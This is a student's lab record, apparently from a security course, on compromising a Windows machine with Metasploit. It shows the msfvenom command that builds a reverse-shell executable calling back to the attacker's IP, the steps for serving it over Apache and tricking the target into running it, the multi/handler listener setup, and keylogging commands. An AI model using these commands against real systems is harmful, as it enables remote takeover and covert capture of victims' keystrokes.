DEVELOPED BY: SRIRAM ARUN S
REGISTER NUMBER: 212225040429


# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:


<img width="798" height="612" alt="Screenshot 2026-11-21 084419" src="https://github.com/user-attachments/assets/0d5fbec5-c3e3-4eac-a024-aa9cdbd58db8" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1018" height="763" alt="Screenshot 2026-11-26 174926" src="https://github.com/user-attachments/assets/31e8015b-7d7f-4222-9068-5c6df61f2a9f" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="1018" height="457" alt="Screenshot 2026-11-26 175447" src="https://github.com/user-attachments/assets/cc02e246-7f15-4e93-906f-1b6d8f03be2a" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="602" height="135" alt="Screenshot 2026-11-26 175644" src="https://github.com/user-attachments/assets/9508d06d-d33a-4c1b-a980-17eba1a27ed2" />

Check the status of apache2
## OUTPUT:
<img width="1012" height="763" alt="Screenshot 2026-11-26 180036" src="https://github.com/user-attachments/assets/c3f87b58-b7cd-4923-b9bc-5e1f0da1778a" />



Invoke msfconsole:
## OUTPUT:
<img width="1026" height="772" alt="Screenshot 2026-11-26 180123" src="https://github.com/user-attachments/assets/289ac287-2ff3-45c8-bb2b-06c2f44fdac2" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="1020" height="768" alt="Screenshot 2026-11-26 180214" src="https://github.com/user-attachments/assets/12e34dbd-e948-493e-8803-a43128c09a9f" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1023" height="762" alt="Screenshot 2026-11-26 180543" src="https://github.com/user-attachments/assets/58c41061-2ee3-4e2b-b237-64e5e1b67446" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="922" height="445" alt="Screenshot 2026-11-26 180705" src="https://github.com/user-attachments/assets/dcf85fbf-a37d-4138-8ff9-a080053df116" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="912" height="437" alt="Screenshot 2026-11-26 180738" src="https://github.com/user-attachments/assets/11dd22ef-6f5a-488c-b100-b2a6402b8092" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="886" height="82" alt="Screenshot 2026-11-26 180855" src="https://github.com/user-attachments/assets/6b18dee1-5b62-41aa-a8ee-af3e9c5e5423" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="590" height="171" alt="Screenshot 2026-11-26 180947" src="https://github.com/user-attachments/assets/f53dde73-6de8-4135-bf1f-1480130cf30e" />



at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="1497" height="721" alt="Screenshot 2026-11-26 181102" src="https://github.com/user-attachments/assets/3bf369db-150d-4076-86db-7ae3fdb6d2a2" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:


<img width="671" height="67" alt="Screenshot 2026-11-26 181524" src="https://github.com/user-attachments/assets/64e5fd35-a3ec-4046-81ff-6a6d131f595d" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="1000" height="115" alt="Screenshot 2026-11-26 181617" src="https://github.com/user-attachments/assets/dfba9375-8206-4f12-8f90-294a23413ad7" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
